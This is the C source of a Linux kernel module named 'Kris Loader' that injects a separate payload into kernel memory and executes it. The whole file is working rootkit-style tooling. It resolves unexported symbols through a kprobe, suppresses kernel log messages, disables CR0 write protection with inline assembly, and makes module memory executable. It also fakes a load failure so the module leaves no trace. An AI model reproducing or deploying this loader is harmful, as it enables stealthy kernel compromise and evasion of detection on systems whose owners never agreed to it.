/**
 * @file main.c
 * @brief This file contains the main module code for the Kris Loader kernel module.
 * 
 * The Kris Loader is a kernel module that injects a payload into the kernel and executes it.
 * This file contains the main module code for the Kris Loader kernel module.
 * It includes the necessary headers, defines some macros, and implements the init_module() function.
 * The init_module() function is called when the module is loaded into the kernel and is responsible for
 * allocating memory for the payload, setting the memory as executable, copying the payload into the allocated memory,
 * and executing the payload.
 * 
 * The module also defines some helper functions such as lookup_name(), zero_wp(), and one_wp().
 * 
 * This module is licensed under the GPL license.
 */
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/kprobes.h>
#include <linux/printk.h>
#include <net/net_namespace.h>

#include "payload.inc"

// Uncomment the following line to enable debug output
// #define DEBUG_LOADER

// Uncomment the following line to disable console suppression
// #define NO_SUPPRESS_KMSG

#ifdef DEBUG_LOADER
#define Dprintk(fmt, ...) printk(KERN_DEBUG "Kris Loader: " fmt, ##__VA_ARGS__)
#else
#define Dprintk(fmt, ...) no_printk(KERN_DEBUG fmt, ##__VA_ARGS__)
#endif

#ifdef NO_SUPPRESS_KMSG
# define suppress_kmsg() do {} while (0)
# define unsuppress_kmsg() do {} while (0)
#else
# define suppress_kmsg() do { smp_mb(); *suppress_printk_ptr = 1; smp_mb(); } while (0)
# define unsuppress_kmsg() do { smp_mb(); *suppress_printk_ptr = 0; smp_mb(); } while (0)
#endif

static struct kprobe kp = {
	.symbol_name = "kallsyms_lookup_name"
};

unsigned long lookup_name(const char *name)
{
	typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
	kallsyms_lookup_name_t kallsyms_lookup_name;
	register_kprobe(&kp);
	kallsyms_lookup_name = (kallsyms_lookup_name_t)kp.addr;
	unregister_kprobe(&kp);

	return kallsyms_lookup_name(name);
}

unsigned long cr0;

extern void *__force_order;

void zero_wp(void)
{
	unsigned long cr0;

	asm volatile("cli\n\t"
				 "mov %%cr0, %0"
				 : "=r"(cr0), "+m"(__force_order)
				 :
				 : "memory");

	cr0 &= ~0x10000UL;

	asm volatile("mov %0, %%cr0"
				 :
				 : "r"(cr0), "m"(__force_order));
}

void one_wp(void)
{
	unsigned long cr0;

	asm volatile("mov %%cr0, %0"
				 : "=r"(cr0), "+m"(__force_order)
				 :
				 : "memory");

	cr0 |= 0x10000UL;

	asm volatile("mov %0, %%cr0\n\t"
				 "sti"
				 :
				 : "r"(cr0), "m"(__force_order));
}

int init_module(void)
{

	void *mem = NULL;
	void *(*malloc)(long size) = NULL;
	int (*set_memory_x)(unsigned long, int) = NULL;

#ifndef NO_SUPPRESS_KMSG
	int *suppress_printk_ptr = NULL;
	suppress_printk_ptr = (int *)lookup_name("suppress_printk");
	if (!suppress_printk_ptr)
	{
		Dprintk("suppress_printk not found\n");
		goto Error;
	}
#endif

	malloc = (void *)lookup_name("module_alloc");
	if (!malloc)
	{
		Dprintk("module_alloc() not found\n");
		goto Error;
	}

	mem = malloc(round_up(payload_len, PAGE_SIZE));
	if (!mem)
	{
		Dprintk("malloc(payload_len) failed\n");
		goto Error;
	}

	Dprintk("About to suppress console, see you on the other side\n");

	suppress_kmsg();

#ifdef NO_SUPPRESS_KMSG
	Dprintk("console would be suppressed here, but since NO_SUPPRESS_KMSG is defined, it isn't\n");
#else
	Dprintk("console suppressed (you shouldn't see this)\n");
#endif

	Dprintk("before open_kernel\n");

	Dprintk("The value of cr0 before modification :%lx\n", read_cr0());

	zero_wp();

	Dprintk("The value of cr0 after open :%lx\n", read_cr0());


	set_memory_x = (void *)lookup_name("set_memory_x");
	if (set_memory_x)
	{
		Dprintk("set_memory_x found\n");
		Dprintk("About to set memory executable\n");
		int numpages = round_up(payload_len, PAGE_SIZE) / PAGE_SIZE;
		set_memory_x((unsigned long)mem, numpages);
	}
	Dprintk("memory set executable!\n");

	memcpy(mem, payload, payload_len);
	Dprintk("memcopy attempted!\n");
	one_wp();
	Dprintk("The value of cr0 after close :%lx\n", read_cr0());

	unsuppress_kmsg();

#ifdef NO_SUPPRESS_KMSG
	Dprintk("console would be unsuppressed here\n");
#else
	Dprintk("console no longer suppressed\n");
#endif

	Dprintk("About to execute payload\n");
	int retval = ((long (*)(void *, void *))mem)(lookup_name, &init_net);
	if (retval == 0)
	{
		Dprintk("payload executed succesfully!\n");
		Dprintk("Telling insmod that we 'failed' (returning -ENOTTY)\n");
		return -ENOTTY;
	}
	else
	{
		Dprintk("payload was injected, but failed to initialise!\n");
		Dprintk("Payload says: %d\n", retval);
	}

Error:
	Dprintk("Error encountered, cleaning up\n");
	if (mem)
	{
		Dprintk("mem was not NULL, attempting to free payload\n");
		vfree(mem);
		Dprintk("vfree(mem) attempted!\n");
	}
	else
	{
		Dprintk("mem was NULL!\n");
		Dprintk("This is probably because module_alloc() failed\n");
	}
	Dprintk("We failed for real, returning -ESRCH\n");
	return -ESRCH;
}

MODULE_LICENSE("GPL");
